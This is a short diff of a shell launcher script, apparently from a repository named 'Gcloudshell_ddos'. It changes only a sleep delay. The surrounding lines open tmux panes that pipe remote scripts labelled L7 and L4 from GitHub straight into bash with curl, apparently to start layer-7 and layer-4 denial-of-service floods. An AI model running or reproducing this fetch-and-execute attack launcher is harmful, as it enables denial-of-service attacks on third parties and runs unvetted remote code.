@@ -13,5 +13,5 @@ python3 -m pip install -r requirements.txt
 cd ~
 
 tmux split-window -v -p 95 'curl -s https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L7 | bash'
-sleep 0.1
+sleep 0.5
 tmux split-window -h -p 50 'curl -s https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L4 | bash'
